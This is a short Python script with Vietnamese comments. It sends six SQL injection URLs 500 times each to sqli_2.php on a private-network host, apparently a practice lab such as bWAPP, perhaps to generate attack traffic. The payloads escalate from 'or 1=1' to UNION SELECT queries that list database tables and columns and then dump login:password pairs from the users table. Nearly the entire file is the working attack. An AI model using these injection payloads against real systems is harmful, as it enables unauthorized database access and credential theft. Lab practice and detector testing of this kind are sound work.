import requests
import time

# Danh sách các URL để thực hiện request
urls = [
    "http://192.168.10.10:80/sqli_2.php?movie=2&action=go' or 1=1",
    "http://192.168.10.10:80/sqli_2.php?movie=2' or 1=1&action=go",
    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, 2,3,4,5,6,7 #&action=go",
    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, (SELECT GROUP_CONCAT(table_name, '---') FROM information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #&action=go",
    "http://192.168.10.10:80/sqli_2.php?movie=100 union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #&action=go",
    "http://192.168.10.10:80/sqli_2.php?movie=100 UNION SELECT 1, (SELECT GROUP_CONCAT(login,':', password) FROM users),3,4,5,6,7 #&action=go"
]

# Số lượng request muốn thực hiện, 500*6 = 3000 url
num_requests = 500

# Hàm gửi request đến từng URL
def send_requests():
    for i in range(num_requests):
        for url in urls:
            try:
                response = requests.get(url)
                print(f"Request {i+1} : thanh cong")
            except Exception as e:
                print(f"request {i+1} : that bai")
        # Thêm delay giữa các request nếu cần (giảm tải cho server)
        time.sleep(6)  # Tùy chỉnh thời gian delay nếu cần

# Bắt đầu thực hiện requests
send_requests()
